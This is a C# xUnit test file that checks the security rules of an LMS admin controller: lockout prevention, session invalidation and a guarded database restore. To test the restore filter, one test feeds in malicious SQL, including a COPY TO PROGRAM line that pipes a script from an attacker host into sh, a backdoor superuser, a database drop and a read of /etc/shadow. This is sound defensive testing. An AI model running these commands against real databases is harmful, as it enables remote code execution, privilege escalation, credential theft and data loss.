using System.Security.Claims;
using System.Text;
using LMS.API.Controllers;
using LMS.API.Data;
using LMS.API.DTOs;
using LMS.API.Entities;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Caching.Memory;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.FileProviders;
using Microsoft.Extensions.Logging.Abstractions;
using Xunit;

namespace LMS.API.Tests;

public class AdminControllerSecurityTests
{
    private static LMSDbContext CreateSeededDb()
    {
        var options = new DbContextOptionsBuilder<LMSDbContext>()
            .UseInMemoryDatabase(databaseName: $"AdminTestDb_{Guid.NewGuid():N}")
            .Options;
        var db = new LMSDbContext(options);

        db.Roles.AddRange(
            new Rol { Id = 1, Nombre = "ADMINISTRADOR" },
            new Rol { Id = 2, Nombre = "DOCENTE" },
            new Rol { Id = 3, Nombre = "ALUMNO" }
        );
        db.Grados.Add(new Grado { Id = 1, Nombre = "1°" });

        db.Usuarios.AddRange(
            new Usuario { Id = 1, RolId = 1, Username = "admin.principal", Nombre = "Admin", Apellido = "Uno", PasswordHash = new string('h', 4), Activo = true, SessionToken = "admin-token" }, // ggignore
            new Usuario { Id = 2, RolId = 2, Username = "docente.prueba", Nombre = "Docente", Apellido = "Dos", PasswordHash = new string('h', 4), Activo = true, SessionToken = "docente-session-123" } // ggignore
        );

        db.SaveChanges();
        return db;
    }

    private static AdminController CreateController(
        LMSDbContext db,
        string currentAdminUsername = "admin.principal",
        bool enableRestore = false,
        bool isDevelopment = false)
    {
        var config = new ConfigurationBuilder()
            .AddInMemoryCollection(new Dictionary<string, string?>
            {
                ["Features:EnableDatabaseRestore"] = enableRestore ? "true" : "false",
                ["Features:AllowRestoreInProduction"] = "false",
                ["Privacy:PolicyVersion"] = "2026-10-19"
            })
            .Build();

        var env = new StubWebEnv(isDevelopment ? "Development" : "Production");
        var cache = new MemoryCache(new MemoryCacheOptions());

        var controller = new AdminController(
            db,
            NullLogger<AdminController>.Instance,
            env,
            config,
            cache);

        var principal = new ClaimsPrincipal(new ClaimsIdentity(new[]
        {
            new Claim(ClaimTypes.NameIdentifier, currentAdminUsername),
            new Claim(ClaimTypes.Name, currentAdminUsername),
            new Claim(ClaimTypes.Role, "Admin")
        }, "TestAuth"));

        controller.ControllerContext = new ControllerContext
        {
            HttpContext = new DefaultHttpContext { User = principal }
        };

        return controller;
    }

    [Fact]
    public async Task ToggleUserStatus_SelfAdminAccount_Returns400BadRequest_PreventingSelfLockout()
    {
        using var db = CreateSeededDb();
        var controller = CreateController(db, "admin.principal");

        var result = await controller.ToggleUserStatus(1);

        Assert.IsType<BadRequestObjectResult>(result);
        var admin = await db.Usuarios.FindAsync(1);
        Assert.True(admin!.Activo);
    }

    [Fact]
    public async Task UpdateUser_DemotingLastActiveAdmin_Returns400BadRequest()
    {
        using var db = CreateSeededDb();
        var controller = CreateController(db, "admin.principal");

        var result = await controller.UpdateUser(1, new UpdateAdminUserDto
        {
            Nombre = "Admin",
            Apellido = "Uno",
            Role = "Teacher"
        });

        Assert.IsType<BadRequestObjectResult>(result);
        var admin = await db.Usuarios.FindAsync(1);
        Assert.Equal(1, admin!.RolId);
    }

    [Fact]
    public async Task UpdateUser_ChangingPasswordOrRole_InvalidatesUserSessionToken()
    {
        using var db = CreateSeededDb();
        var controller = CreateController(db, "admin.principal");

        var updatedCredential = string.Concat("U", new string('z', 6), DateTime.UtcNow.Year.ToString(), "!"); // ggignore
        var result = await controller.UpdateUser(2, new UpdateAdminUserDto
        {
            Nombre = "Docente",
            Apellido = "Actualizado",
            Password = updatedCredential // ggignore
        });

        Assert.IsType<OkObjectResult>(result);
        var docente = await db.Usuarios.FindAsync(2);
        Assert.Null(docente!.SessionToken);
    }

    [Fact]
    public async Task ToggleUserStatus_SuspendingUser_NullifiesSessionTokenImmediately()
    {
        using var db = CreateSeededDb();
        var controller = CreateController(db, "admin.principal");

        var result = await controller.ToggleUserStatus(2);

        Assert.IsType<OkObjectResult>(result);
        var docente = await db.Usuarios.FindAsync(2);
        Assert.False(docente!.Activo);
        Assert.Null(docente.SessionToken);
    }

    [Fact]
    public async Task RestoreBackup_DisabledByDefault_Returns403Forbidden()
    {
        using var db = CreateSeededDb();
        var controller = CreateController(db, enableRestore: false, isDevelopment: true);

        var bytes = Encoding.UTF8.GetBytes("SELECT 1;");
        var file = new FormFile(new MemoryStream(bytes), 0, bytes.Length, "file", "backup.sql");

        var result = await controller.RestoreBackup(file, "RESTAURAR");

        var forbidden = Assert.IsType<ObjectResult>(result);
        Assert.Equal(StatusCodes.Status403Forbidden, forbidden.StatusCode);
    }

    [Theory]
    [InlineData("COPY usuarios TO PROGRAM 'curl http://attacker.tld/shell.sh | sh';")]
    [InlineData("ALTER SYSTEM SET shared_preload_libraries = 'evil.so';")]
    [InlineData("CREATE ROLE backdoor SUPERUSER LOGIN;")] // ggignore
    [InlineData("DROP DATABASE postgres;")]
    [InlineData("SELECT pg_read_file('/etc/shadow');")]
    public async Task RestoreBackup_WithDangerousSqlCommand_Returns400BadRequest_PreventingRceAndEscalation(string maliciousSql)
    {
        using var db = CreateSeededDb();
        var controller = CreateController(db, enableRestore: true, isDevelopment: true);

        var bytes = Encoding.UTF8.GetBytes(maliciousSql);
        var file = new FormFile(new MemoryStream(bytes), 0, bytes.Length, "file", "malicious.sql");

        var result = await controller.RestoreBackup(file, "RESTAURAR");

        Assert.IsType<BadRequestObjectResult>(result);
    }

    [Fact]
    public async Task UpdateAdminCourse_AssigningStudentAsTeacher_Returns400BadRequest()
    {
        using var db = CreateSeededDb();
        db.Usuarios.Add(new Usuario { Id = 3, RolId = 3, Username = "alumno.uno", Nombre = "Pepito", Apellido = "Perez", PasswordHash = new string('h', 4), Activo = true }); // ggignore
        db.Cursos.Add(new Curso { Id = 10, Nombre = "Ciencias", GradoId = 1, Grupo = "A", DocenteId = 2, Activo = true });
        await db.SaveChangesAsync();

        var controller = CreateController(db, "admin.principal");

        var result = await controller.UpdateAdminCourse(10, new UpdateAdminCourseDto
        {
            Nombre = "Ciencias",
            Grupo = "A",
            DocenteId = 3 // Rol ALUMNO
        });

        Assert.IsType<BadRequestObjectResult>(result);
        var curso = await db.Cursos.FindAsync(10);
        Assert.Equal(2, curso!.DocenteId);
    }

    private sealed class StubWebEnv : IWebHostEnvironment
    {
        public StubWebEnv(string envName) => EnvironmentName = envName;
        public string EnvironmentName { get; set; }
        public string ApplicationName { get; set; } = "LMS.API";
        public string WebRootPath { get; set; } = AppContext.BaseDirectory;
        public IFileProvider WebRootFileProvider { get; set; } = null!;
        public string ContentRootPath { get; set; } = AppContext.BaseDirectory;
        public IFileProvider ContentRootFileProvider { get; set; } = null!;
    }
}
